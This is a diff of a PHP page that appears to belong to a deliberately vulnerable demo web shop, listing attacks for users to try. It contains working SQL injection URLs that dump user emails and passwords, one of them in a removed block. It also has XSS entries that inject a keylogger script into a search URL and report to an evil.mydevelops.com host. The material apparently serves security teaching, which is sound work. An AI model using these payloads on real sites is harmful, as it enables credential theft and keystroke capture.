@@ -17,13 +17,6 @@ $attacks[1] = array(
     "value" => "0' UNION SELECT 'bla', email as name, pw as description, 'bla', 'bla','bla' FROM users WHERE id=1 --",
     "attack" => "product.php?id=0'%20UNION%20SELECT%20'bla',%20email%20as%20name,%20pw%20as%20description,%20'bla',%20'bla','bla'%20FROM%20users%20WHERE%20id=1%20%20--");
 
-$attacks[2] = array(
-    "name" => "SQL Injection",
-    "description" => "Show email and password",
-   "value" => "UNION SELECT email as id, pw as name, email as description, email as price, email as secret, email as hidden FROM users--",
-   "attack" => "product.php?id=-1%27%20UNION%20SELECT%20email%20as%20id,%20email%20as%20name,%20pw%20as%20description,%20email%20as%20price,%20email%20as%20secret,%20email%20as%20hidden%20FROM%20users--"
-);
-
 $xss = '
 var buffer = [];
 var data;
@@ -50,14 +43,14 @@ window.setInterval(function() {
 
 //$xss = trim(preg_replace('/\s\s+/', ' ', $xss));
 
-$attacks[3] = array(
+$attacks[2] = array(
     "name" => "XSS attack",
     "description" => "Log your pressed keys",
-   "value" => "Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
-   "attack" => "listing.php?search=No risk, No fun. I don recommend using this app, because it can be harmfull!<script>".$xss."</script>"
+    "value" => "Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
+    "attack" => "listing.php?search=No risk, No fun. I don recommend using this app, because it can be harmfull!<script>".$xss."</script>"
 );
 
-$attacks[4] = array(
+$attacks[3] = array(
     "name" => "XSS attack",
     "description" => "Steal your password on login site!",
     "value" => "Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
@@ -77,7 +70,7 @@ include_once("header.php");
 		<div class="card-panel">   
 			<h4>Make some nice attack</h4>  
             <table class=" highlight stripped responsive-table listing">
-               
+                
                 <tbody>
                     <?php foreach($attacks as $attack): ?>
                         <tr>
